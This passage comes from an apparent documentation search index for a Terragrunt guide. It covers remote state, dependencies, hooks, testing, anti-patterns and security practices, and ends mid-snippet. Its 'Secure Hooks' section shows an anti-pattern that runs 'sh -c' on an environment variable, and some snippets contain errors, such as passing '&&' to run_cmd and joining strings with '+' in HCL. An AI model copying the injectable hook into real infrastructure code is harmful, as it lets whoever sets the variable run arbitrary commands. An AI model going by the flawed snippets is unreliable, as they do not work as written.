root_terragrunt\n## @description Root Terragrunt configuration for remote state and provider settings\n## @version 1.0.0\n## @author Tyler Dukes\n## @last_updated 2025-10-28\n\n## Generate backend configuration for all child modules\nremote_state {\n  backend = \"s3\"\n\n  config = {\n    bucket         = \"my-terraform-state-${local.account_id}\"\n    key            = \"${path_relative_to_include()}/terraform.tfstate\"\n    region         = local.aws_region\n    encrypt        = true\n    dynamodb_table = \"terraform-locks\"\n\n    s3_bucket_tags = {\n      Name        = \"Terraform State\"\n      Environment = local.environment\n    }\n\n    dynamodb_table_tags = {\n      Name        = \"Terraform Locks\"\n      Environment = local.environment\n    }\n  }\n\n  generate = {\n    path      = \"backend.tf\"\n    if_exists = \"overwrite_terragrunt\"\n  }\n}\n\n## Generate provider configuration\ngenerate \"provider\" {\n  path      = \"provider.tf\"\n  if_exists = \"overwrite_terragrunt\"\n\n  contents = &lt;&lt;-EOF\n    provider \"aws\" {\n      region = \"${local.aws_region}\"\n\n      default_tags {\n        tags = {\n          Environment = \"${local.environment}\"\n          ManagedBy   = \"Terragrunt\"\n          Region      = \"${local.aws_region}\"\n        }\n      }\n    }\n  EOF\n}\n\n## Local variables available to all child configurations\nlocals {\n  # Parse environment and region from path\n  # Expected path: live/&lt;environment&gt;/&lt;region&gt;/&lt;stack&gt;/terragrunt.hcl\n  path_parts  = split(\"/\", path_relative_to_include())\n  environment = length(local.path_parts) &gt; 0 ? local.path_parts[0] : \"dev\"\n  aws_region  = length(local.path_parts) &gt; 1 ? local.path_parts[1] : \"us-east-1\"\n\n  # Account ID mapping\n  account_ids = {\n    prod    = \"111111111111\"\n    staging = \"222222222222\"\n    dev     = \"333333333333\"\n  }\n\n  account_id = lookup(local.account_ids, local.environment, \"333333333333\")\n\n  # Common tags\n  common_tags = {\n    Environment = local.environment\n    ManagedBy   = \"Terragrunt\"\n    Region      = local.aws_region\n    AccountId   = local.account_id\n  }\n}\n\n## Terraform version constraints\nterraform {\n  extra_arguments \"common_vars\" {\n    commands = get_terraform_commands_that_need_vars()\n\n    env_vars = {\n      TF_INPUT = \"false\"\n    }\n  }\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#child-terragrunthcl-files","title":"Child terragrunt.hcl Files","text":"","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#basic-child-configuration","title":"Basic Child Configuration","text":"<pre><code>## @module vpc_live\n## @description VPC configuration for production us-east-1\n## @version 1.0.0\n## @author Tyler Dukes\n## @last_updated 2025-10-28\n\n## Include root configuration\ninclude \"root\" {\n  path = find_in_parent_folders()\n}\n\n## Reference Terraform module\nterraform {\n  source = \"${get_repo_root()}/modules//vpc\"\n\n  # Or use Git repository\n  # source = \"git::ssh://git@github.com/myorg/terraform-modules.git//vpc?ref=v1.2.0\"\n}\n\n## Module inputs\ninputs = {\n  vpc_name            = \"prod-vpc-us-east-1\"\n  cidr_block          = \"10.0.0.0/16\"\n  availability_zones  = [\"us-east-1a\", \"us-east-1b\", \"us-east-1c\"]\n  public_subnets      = [\"10.0.1.0/24\", \"10.0.2.0/24\", \"10.0.3.0/24\"]\n  private_subnets     = [\"10.0.11.0/24\", \"10.0.12.0/24\", \"10.0.13.0/24\"]\n  enable_nat_gateway  = true\n  enable_vpn_gateway  = false\n\n  tags = {\n    Project = \"MyApp\"\n    Owner   = \"Platform Team\"\n  }\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#configuration-with-dependencies","title":"Configuration with Dependencies","text":"<pre><code>## @module eks_live\n## @description EKS cluster depending on VPC\n## @version 1.0.0\n## @author Tyler Dukes\n## @last_updated 2025-10-28\n\ninclude \"root\" {\n  path = find_in_parent_folders()\n}\n\nterraform {\n  source = \"${get_repo_root()}/modules//eks\"\n}\n\n## Dependency on VPC module\ndependency \"vpc\" {\n  config_path = \"../vpc\"\n\n  # Mock outputs for faster plan/validate without applying VPC first\n  mock_outputs = {\n    vpc_id              = \"vpc-mock-id\"\n    private_subnet_ids  = [\"subnet-mock-1\", \"subnet-mock-2\"]\n  }\n\n  mock_outputs_allowed_terraform_commands = [\"validate\", \"plan\"]\n}\n\ninputs = {\n  cluster_name    = \"prod-eks-us-east-1\"\n  cluster_version = \"1.28\"\n\n  # Use VPC outputs as inputs\n  vpc_id             = dependency.vpc.outputs.vpc_id\n  subnet_ids         = dependency.vpc.outputs.private_subnet_ids\n\n  node_groups = {\n    general = {\n      desired_capacity = 3\n      max_capacity     = 10\n      min_capacity     = 1\n      instance_types   = [\"t3.large\"]\n    }\n  }\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#configuration-with-multiple-dependencies","title":"Configuration with Multiple Dependencies","text":"<pre><code>## @module rds_live\n## @description RDS database depending on VPC and security groups\n## @version 1.0.0\n## @author Tyler Dukes\n## @last_updated 2025-10-28\n\ninclude \"root\" {\n  path = find_in_parent_folders()\n}\n\nterraform {\n  source = \"${get_repo_root()}/modules//rds\"\n}\n\ndependency \"vpc\" {\n  config_path = \"../vpc\"\n\n  mock_outputs = {\n    vpc_id              = \"vpc-mock-id\"\n    private_subnet_ids  = [\"subnet-mock-1\", \"subnet-mock-2\"]\n  }\n\n  mock_outputs_allowed_terraform_commands = [\"validate\", \"plan\"]\n}\n\ndependency \"security_groups\" {\n  config_path = \"../security-groups\"\n\n  mock_outputs = {\n    database_security_group_id = \"sg-mock-id\"\n  }\n\n  mock_outputs_allowed_terraform_commands = [\"validate\", \"plan\"]\n}\n\ninputs = {\n  identifier          = \"prod-postgres\"\n  engine              = \"postgres\"\n  engine_version      = \"15.3\"\n  instance_class      = \"db.t3.large\"\n  allocated_storage   = 100\n\n  vpc_id             = dependency.vpc.outputs.vpc_id\n  subnet_ids         = dependency.vpc.outputs.private_subnet_ids\n  security_group_ids = [dependency.security_groups.outputs.database_security_group_id]\n\n  backup_retention_period = 7\n  multi_az               = true\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#generate-blocks","title":"Generate Blocks","text":"","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#generating-files","title":"Generating Files","text":"<pre><code>## Generate versions.tf\ngenerate \"versions\" {\n  path      = \"versions.tf\"\n  if_exists = \"overwrite\"\n\n  contents = &lt;&lt;-EOF\n    terraform {\n      required_version = \"&gt;= 1.5.0\"\n\n      required_providers {\n        aws = {\n          source  = \"hashicorp/aws\"\n          version = \"~&gt; 5.0\"\n        }\n      }\n    }\n  EOF\n}\n\n## Generate data sources\ngenerate \"common_data\" {\n  path      = \"data.tf\"\n  if_exists = \"overwrite\"\n\n  contents = &lt;&lt;-EOF\n    data \"aws_caller_identity\" \"current\" {}\n    data \"aws_region\" \"current\" {}\n  EOF\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#hooks","title":"Hooks","text":"","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#before-and-after-hooks","title":"Before and After Hooks","text":"<pre><code>terraform {\n  source = \"${get_repo_root()}/modules//vpc\"\n\n  # Format code before plan/apply\n  before_hook \"terraform_fmt\" {\n    commands = [\"plan\", \"apply\"]\n    execute  = [\"terraform\", \"fmt\"]\n  }\n\n  # Validate before plan\n  before_hook \"terraform_validate\" {\n    commands = [\"plan\"]\n    execute  = [\"terraform\", \"validate\"]\n  }\n\n  # Run custom script after apply\n  after_hook \"notify_deployment\" {\n    commands     = [\"apply\"]\n    execute      = [\"bash\", \"${get_repo_root()}/scripts/notify-deployment.sh\"]\n    run_on_error = false\n  }\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#running-terragrunt","title":"Running Terragrunt","text":"","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#common-commands","title":"Common Commands","text":"<pre><code>## Initialize and apply single module\ncd live/prod/us-east-1/vpc\nterragrunt init\nterragrunt plan\nterragrunt apply\n\n## Run plan for all modules in current directory and subdirectories\nterragrunt run-all plan\n\n## Apply all modules in dependency order\nterragrunt run-all apply\n\n## Destroy specific module\nterragrunt destroy\n\n## Destroy all modules in reverse dependency order\nterragrunt run-all destroy\n\n## Validate all configurations\nterragrunt run-all validate\n\n## Format all HCL files\nterragrunt hclfmt\n\n## Show outputs\nterragrunt output\n\n## Show dependency graph\nterragrunt graph-dependencies\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#dependency-management","title":"Dependency Management","text":"","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#explicit-dependencies","title":"Explicit Dependencies","text":"<pre><code>## Define dependencies to ensure correct apply order\ndependencies {\n  paths = [\n    \"../vpc\",\n    \"../security-groups\"\n  ]\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#skip-dependencies","title":"Skip Dependencies","text":"<pre><code>## Skip dependency for faster iteration during development\ndependency \"vpc\" {\n  config_path = \"../vpc\"\n\n  skip_outputs = true\n\n  mock_outputs = {\n    vpc_id = \"vpc-mock-id\"\n  }\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#best-practices","title":"Best Practices","text":"","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#use-mock-outputs","title":"Use Mock Outputs","text":"<pre><code>## Always provide mock outputs for faster plan/validate\ndependency \"vpc\" {\n  config_path = \"../vpc\"\n\n  mock_outputs = {\n    vpc_id             = \"vpc-00000000\"\n    public_subnet_ids  = [\"subnet-00000001\", \"subnet-00000002\"]\n    private_subnet_ids = [\"subnet-00000003\", \"subnet-00000004\"]\n  }\n\n  mock_outputs_allowed_terraform_commands = [\"validate\", \"plan\"]\n  mock_outputs_merge_strategy_with_state  = \"shallow\"\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#use-get_repo_root","title":"Use get_repo_root()","text":"<pre><code>## Good - Portable across different directory depths\nterraform {\n  source = \"${get_repo_root()}/modules//vpc\"\n}\n\n## Avoid - Brittle with multiple ../\nterraform {\n  source = \"../../../modules//vpc\"\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#keep-inputs-dry-with-locals","title":"Keep Inputs DRY with Locals","text":"<pre><code>locals {\n  # Define common inputs in locals\n  common_tags = {\n    Environment = \"production\"\n    ManagedBy   = \"Terragrunt\"\n    Project     = \"MyApp\"\n  }\n\n  vpc_config = {\n    cidr_block = \"10.0.0.0/16\"\n    azs        = [\"us-east-1a\", \"us-east-1b\", \"us-east-1c\"]\n  }\n}\n\ninputs = merge(\n  local.vpc_config,\n  {\n    vpc_name = \"prod-vpc\"\n    tags     = local.common_tags\n  }\n)\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#testing","title":"Testing","text":"","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#validate-terragrunt-configuration","title":"Validate Terragrunt Configuration","text":"<pre><code>## Validate configuration syntax\nterragrunt validate-all\n\n## Check formatting\nterragrunt hclfmt --terragrunt-check\n\n## Format files\nterragrunt hclfmt\n\n## Validate specific module\ncd envs/production\nterragrunt validate\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#testing-with-terragrunt-plan","title":"Testing with terragrunt plan","text":"<pre><code>## Plan all modules\nterragrunt run-all plan\n\n## Plan specific module\ncd envs/production/vpc\nterragrunt plan\n\n## Save plan for testing\nterragrunt plan -out=tfplan\nterraform show -json tfplan &gt; tfplan.json\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#policy-testing-with-conftest","title":"Policy Testing with conftest","text":"<p>Test Terragrunt-generated plans:</p> <pre><code>## Test plan with policies\nterragrunt plan -out=tfplan\nterraform show -json tfplan | conftest test -p policy/ -\n\n## Test all modules\nterragrunt run-all plan -out=tfplan\nfor dir in envs/*/*; do\n  cd \"$dir\"\n  terraform show -json tfplan | conftest test -p ../../../policy/ -\n  cd -\ndone\n</code></pre> <p>Example policy:</p> <pre><code>## policy/terragrunt.rego\npackage terragrunt\n\ndeny[msg] {\n  resource := input.planned_values.root_module.resources[_]\n  resource.type == \"aws_s3_bucket\"\n  not resource.values.versioning[_].enabled\n  msg := sprintf(\"S3 bucket %s must have versioning enabled\", [resource.address])\n}\n\ndeny[msg] {\n  resource := input.planned_values.root_module.resources[_]\n  resource.type == \"aws_instance\"\n  not startswith(resource.values.instance_type, \"t3\")\n  msg := sprintf(\"Instance %s must use t3 instance type\", [resource.address])\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#testing-dependencies","title":"Testing Dependencies","text":"<p>Verify module dependencies resolve correctly:</p> <pre><code>## Test dependency graph\nterragrunt graph-dependencies | dot -Tpng &gt; dependencies.png\n\n## Validate dependencies exist\nterragrunt run-all validate\n\n## Test dependency order\nterragrunt run-all plan --terragrunt-log-level debug\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#integration-testing","title":"Integration Testing","text":"<p>Test full infrastructure deployment:</p> <pre><code>## tests/integration-test.sh\n#!/bin/bash\nset -e\n\necho \"Testing Terragrunt configuration...\"\n\n## Validate all configurations\nterragrunt run-all validate\n\n## Plan all changes\nterragrunt run-all plan\n\n## Apply in test environment\ncd envs/test\nterragrunt run-all apply -auto-approve\n\n## Run smoke tests\n./tests/smoke-test.sh\n\n## Destroy test resources\nterragrunt run-all destroy -auto-approve\n\necho \"Integration tests passed!\"\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#testing-with-terratest","title":"Testing with Terratest","text":"<pre><code>## tests/terragrunt_test.go\npackage test\n\nimport (\n    \"testing\"\n    \"github.com/gruntwork-io/terratest/modules/terraform\"\n    \"github.com/stretchr/testify/assert\"\n)\n\nfunc TestTerragruntVPC(t *testing.T) {\n    t.Parallel()\n\n    terraformOptions := &amp;terraform.Options{\n        TerraformDir: \"../envs/test/vpc\",\n        TerraformBinary: \"terragrunt\",\n    }\n\n    defer terraform.Destroy(t, terraformOptions)\n    terraform.InitAndApply(t, terraformOptions)\n\n    vpcID := terraform.Output(t, terraformOptions, \"vpc_id\")\n    assert.NotEmpty(t, vpcID)\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#cicd-testing","title":"CI/CD Testing","text":"<pre><code>## .github/workflows/terragrunt-test.yml\nname: Terragrunt Tests\n\non: [push, pull_request]\n\njobs:\n  validate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Setup Terragrunt\n        run: |\n          wget https://github.com/gruntwork-io/terragrunt/releases/latest/download/terragrunt_linux_amd64\n          chmod +x terragrunt_linux_amd64\n          sudo mv terragrunt_linux_amd64 /usr/local/bin/terragrunt\n\n      - name: Validate format\n        run: terragrunt hclfmt --terragrunt-check\n\n      - name: Validate all\n        run: terragrunt run-all validate\n\n      - name: Plan all\n        run: terragrunt run-all plan\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#testing-state-management","title":"Testing State Management","text":"<pre><code>## Verify remote state configuration\nterragrunt run-all init -backend=false\n\n## Test state isolation\ncd envs/production\nterragrunt state list\n\ncd ../staging\nterragrunt state list\n\n## Verify no shared state\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#mock-testing","title":"Mock Testing","text":"<p>Test without actually deploying:</p> <pre><code>## Use -lock=false for testing\nterragrunt plan -lock=false\n\n## Test with mock data\nexport TF_VAR_environment=test\nexport TF_VAR_region=us-east-1\nterragrunt plan\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#performance-testing","title":"Performance Testing","text":"<pre><code>## Measure plan time\ntime terragrunt run-all plan\n\n## Test with parallelism\nterragrunt run-all plan --terragrunt-parallelism 10\n\n## Measure per-module performance\nfor dir in envs/production/*; do\n  cd \"$dir\"\n  echo \"Testing $dir\"\n  time terragrunt plan\n  cd -\ndone\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#anti-patterns","title":"Anti-Patterns","text":"","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#avoid-hardcoded-values-everywhere","title":"\u274c Avoid: Hardcoded Values Everywhere","text":"<pre><code>## Bad - Hardcoded values in each child\ninputs = {\n  environment = \"prod\"\n  region      = \"us-east-1\"\n}\n\n## Good - Parse from path in root terragrunt.hcl\nlocals {\n  path_parts  = split(\"/\", path_relative_to_include())\n  environment = local.path_parts[0]\n  region      = local.path_parts[1]\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#avoid-not-using-dependencies","title":"\u274c Avoid: Not Using Dependencies","text":"<pre><code>## Bad - Manually passing outputs\ninputs = {\n  vpc_id = \"vpc-1234567890abcdef\"  # Hardcoded!\n}\n\n## Good - Use dependency block\ndependency \"vpc\" {\n  config_path = \"../vpc\"\n}\n\ninputs = {\n  vpc_id = dependency.vpc.outputs.vpc_id\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#avoid-inconsistent-directory-structure","title":"\u274c Avoid: Inconsistent Directory Structure","text":"<pre><code>## Bad - Inconsistent paths\nlive/\n\u251c\u2500\u2500 prod-vpc/\n\u251c\u2500\u2500 staging/vpc/\n\u2514\u2500\u2500 dev_us_east_1/vpc/\n\n## Good - Consistent structure\nlive/\n\u251c\u2500\u2500 prod/us-east-1/vpc/\n\u251c\u2500\u2500 staging/us-east-1/vpc/\n\u2514\u2500\u2500 dev/us-east-1/vpc/\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#avoid-not-using-generate-blocks","title":"\u274c Avoid: Not Using generate Blocks","text":"<pre><code>## Bad - Provider configuration duplicated in every module\n## Repeated in every terragrunt.hcl\n\n## Good - Generate provider in root\ngenerate \"provider\" {\n  path      = \"provider.tf\"\n  if_exists = \"overwrite_terragrunt\"\n  contents  = &lt;&lt;EOF\nprovider \"aws\" {\n  region = \"${local.region}\"\n  assume_role {\n    role_arn = \"arn:aws:iam::${local.account_id}:role/TerraformRole\"\n  }\n}\nEOF\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#avoid-not-using-remote_state","title":"\u274c Avoid: Not Using remote_state","text":"<pre><code>## Bad - Each module configures backend separately\n\n## Good - Configure remote state in root\nremote_state {\n  backend = \"s3\"\n  config = {\n    bucket         = \"my-terraform-state-${local.account_id}\"\n    key            = \"${path_relative_to_include()}/terraform.tfstate\"\n    region         = \"us-east-1\"\n    encrypt        = true\n    dynamodb_table = \"terraform-locks\"\n  }\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#avoid-not-using-run_cmd-for-dynamic-values","title":"\u274c Avoid: Not Using run_cmd for Dynamic Values","text":"<pre><code>## Bad - Static values that should be dynamic\nlocals {\n  account_id = \"123456789012\"  # \u274c Hardcoded\n}\n\n## Good - Get dynamically\nlocals {\n  account_id = run_cmd(\"aws\", \"sts\", \"get-caller-identity\", \"--query\", \"Account\", \"--output\", \"text\")\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#avoid-deep-module-paths-without-include","title":"\u274c Avoid: Deep Module Paths Without include","text":"<pre><code>## Bad - Duplicating terraform source in each child\nterraform {\n  source = \"git::https://github.com/org/modules.git//vpc?ref=v1.0.0\"\n}\n\n## Good - Define in root, reference in children\n## Root terragrunt.hcl\nterraform {\n  source = \"${get_parent_terragrunt_dir()}/modules//vpc\"\n}\n\n## Child just includes\ninclude \"root\" {\n  path = find_in_parent_folders()\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#security-best-practices","title":"Security Best Practices","text":"","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#secure-state-backend-configuration","title":"Secure State Backend Configuration","text":"<p>Always use encrypted remote state backends with proper access controls.</p> <pre><code>## Bad - Local state (not secure for teams)\n## terragrunt.hcl\nterraform {\n  source = \"git::https://github.com/org/modules//vpc\"\n}\n## State stored locally - no encryption, no locking!\n\n## Good - S3 backend with encryption\nremote_state {\n  backend = \"s3\"\n  config = {\n    bucket         = \"mycompany-terraform-state\"\n    key            = \"${path_relative_to_include()}/terraform.tfstate\"\n    region         = \"us-east-1\"\n    encrypt        = true  # Server-side encryption\n    kms_key_id     = \"arn:aws:kms:us-east-1:123456789012:key/12345678-1234-1234-1234-123456789012\"\n    dynamodb_table = \"terraform-locks\"  # State locking\n\n    ## Restrict access\n    acl            = \"private\"\n\n    ## Enable versioning for recovery\n    versioning     = true\n  }\n  generate = {\n    path      = \"backend.tf\"\n    if_exists = \"overwrite_terragrunt\"\n  }\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#secrets-management","title":"Secrets Management","text":"<p>Never commit secrets to terragrunt.hcl files.</p> <pre><code>## Bad - Hardcoded secrets\n## terragrunt.hcl\ninputs = {\n  database_password = \"SuperSecret123\"  # NEVER!\n  api_key          = \"sk_live_abc123\"   # Exposed in version control!\n}\n\n## Good - Use environment variables\ninputs = {\n  database_password = get_env(\"TF_VAR_database_password\", \"\")\n  api_key          = get_env(\"TF_VAR_api_key\", \"\")\n}\n\n## Better - Use AWS Secrets Manager/Parameter Store\nlocals {\n  secrets = yamldecode(sops_decrypt_file(\"${get_terragrunt_dir()}/secrets.enc.yaml\"))\n}\n\ninputs = {\n  database_password = local.secrets.database_password\n  api_key          = local.secrets.api_key\n}\n\n## Best - Use SOPS for encrypted files\n## Encrypt secrets file\n## sops --encrypt secrets.yaml &gt; secrets.enc.yaml\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#input-validation","title":"Input Validation","text":"<p>Validate inputs to prevent misconfigurations.</p> <pre><code>## Good - Validate environment names\nlocals {\n  environment = get_env(\"ENVIRONMENT\", \"dev\")\n\n  ## Validate environment\n  valid_environments = [\"dev\", \"staging\", \"prod\"]\n  is_valid_env      = contains(local.valid_environments, local.environment)\n}\n\ninputs = {\n  environment = local.is_valid_env ? local.environment : run_cmd(\n    \"--terragrunt-quiet\", \"echo\",\n    \"Error: Invalid environment ${local.environment}\", \"&amp;&amp;\", \"exit\", \"1\"\n  )\n\n  ## Validate CIDR blocks\n  vpc_cidr = get_env(\"VPC_CIDR\")\n\n  ## Validation in module will check format\n}\n\n## Good - Validate AWS region\nlocals {\n  aws_region = get_env(\"AWS_REGION\", \"us-east-1\")\n\n  valid_regions = [\n    \"us-east-1\", \"us-east-2\", \"us-west-1\", \"us-west-2\",\n    \"eu-west-1\", \"eu-central-1\", \"ap-southeast-1\"\n  ]\n}\n\ninputs = {\n  aws_region = contains(local.valid_regions, local.aws_region) ? local.aws_region : \"us-east-1\"\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#dependency-security","title":"Dependency Security","text":"<p>Trust but verify module sources and dependencies.</p> <pre><code>## Bad - Unverified module source\nterraform {\n  source = \"github.com/random-user/terraform-modules//vpc\"  # Untrusted!\n}\n\n## Bad - Using latest/master (no version pinning)\nterraform {\n  source = \"git::https://github.com/org/modules.git//vpc?ref=master\"  # Unpredictable!\n}\n\n## Good - Pin to specific verified version\nterraform {\n  source = \"git::https://github.com/your-org/terraform-modules.git//vpc?ref=v1.2.3\"\n}\n\n## Good - Use release tags with verification\nterraform {\n  source = \"git::ssh://git@github.com/your-org/modules.git//vpc?ref=v1.2.3\"\n}\n\ndependency \"vpc\" {\n  config_path = \"../vpc\"\n\n  ## Skip outputs if VPC doesn't exist (safe default)\n  skip_outputs = true\n\n  ## Mock outputs for plan operations\n  mock_outputs = {\n    vpc_id     = \"vpc-mock-id\"\n    subnet_ids = [\"subnet-mock-1\", \"subnet-mock-2\"]\n  }\n  mock_outputs_allowed_terraform_commands = [\"validate\", \"plan\"]\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#iam-role-security","title":"IAM Role Security","text":"<p>Use assume_role with proper constraints.</p> <pre><code>## Bad - Over-privileged role\ngenerate \"provider\" {\n  path      = \"provider.tf\"\n  if_exists = \"overwrite_terragrunt\"\n  contents  = &lt;&lt;EOF\nprovider \"aws\" {\n  region = \"${local.aws_region}\"\n\n  assume_role {\n    role_arn = \"arn:aws:iam::123456789012:role/TerraformAdmin\"  # Too broad!\n  }\n}\nEOF\n}\n\n## Good - Environment-specific roles with external ID\nlocals {\n  account_id  = get_env(\"AWS_ACCOUNT_ID\")\n  environment = get_env(\"ENVIRONMENT\")\n  external_id = get_env(\"TERRAFORM_EXTERNAL_ID\")  # Additional security\n}\n\ngenerate \"provider\" {\n  path      = \"provider.tf\"\n  if_exists = \"overwrite_terragrunt\"\n  contents  = &lt;&lt;EOF\nprovider \"aws\" {\n  region = \"${local.aws_region}\"\n\n  assume_role {\n    role_arn    = \"arn:aws:iam::${local.account_id}:role/Terraform-${local.environment}\"\n    external_id = \"${local.external_id}\"\n    session_name = \"terragrunt-${local.environment}-$${USER}\"\n  }\n\n  default_tags {\n    tags = {\n      ManagedBy   = \"Terragrunt\"\n      Environment = \"${local.environment}\"\n      Owner       = \"$${USER}\"\n    }\n  }\n}\nEOF\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#sensitive-output-protection","title":"Sensitive Output Protection","text":"<p>Mark sensitive outputs appropriately.</p> <pre><code>## Bad - Exposing sensitive data\ndependency \"rds\" {\n  config_path = \"../rds\"\n}\n\ninputs = {\n  db_host     = dependency.rds.outputs.endpoint\n  db_password = dependency.rds.outputs.password  # Logged in plan output!\n}\n\n## Good - Use sensitive flag in module outputs\n## In RDS module outputs.tf:\noutput \"password\" {\n  value     = random_password.db_password.result\n  sensitive = true  # Prevents logging in Terraform output\n}\n\n## In terragrunt.hcl - outputs remain sensitive\ndependency \"rds\" {\n  config_path = \"../rds\"\n}\n\ninputs = {\n  db_host     = dependency.rds.outputs.endpoint\n  db_password = dependency.rds.outputs.password  # Still sensitive\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#lock-file-integrity","title":"Lock File Integrity","text":"<p>Use and verify lock files.</p> <pre><code>## Bad - Ignoring lock files\n## .gitignore\n.terraform.lock.hcl  # DON'T IGNORE!\n\n## Good - Commit lock files\n## .gitignore should NOT include:\n## .terraform.lock.hcl (commit this!)\n\n## In CI/CD pipeline\n## terraform.yml\nsteps:\n  - name: Verify lock file\n    run: |\n      if ! git diff --exit-code .terraform.lock.hcl; then\n        echo \"Error: Lock file has uncommitted changes\"\n        exit 1\n      fi\n\n  - name: Run terragrunt\n    run: |\n      terragrunt run-all plan\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#prevent-accidental-destruction","title":"Prevent Accidental Destruction","text":"<p>Use prevent_destroy and require confirmations.</p> <pre><code>## Good - Require confirmation for prod\nlocals {\n  environment = get_env(\"ENVIRONMENT\")\n}\n\n## Prevent accidental destroy in production\nterraform {\n  before_hook \"prevent_destroy\" {\n    commands = [\"destroy\"]\n    execute  = local.environment == \"prod\" ? [\n      \"bash\", \"-c\",\n      \"echo 'ERROR: Cannot destroy production environment!' &amp;&amp; exit 1\"\n    ] : [\"echo\", \"Destroy allowed in ${local.environment}\"]\n  }\n}\n\n## Require manual approval\nterraform {\n  before_hook \"require_approval\" {\n    commands = [\"apply\"]\n    execute  = local.environment == \"prod\" ? [\n      \"bash\", \"-c\",\n      \"read -p 'Apply to PRODUCTION? (yes/no): ' confirm &amp;&amp; \" +\n      \"[ \\\"$confirm\\\" = \\\"yes\\\" ] || exit 1\"\n    ] : [\"echo\", \"Proceeding with apply\"]\n  }\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#secure-hooks","title":"Secure Hooks","text":"<p>Validate hook scripts and limit execution.</p> <pre><code>## Bad - Arbitrary command execution\nterraform {\n  after_hook \"notify\" {\n    commands = [\"apply\"]\n    execute  = [\"sh\", \"-c\", get_env(\"NOTIFY_COMMAND\")]  # Dangerous!\n  }\n}\n\n## Good - Controlled hook execution\nterraform {\n  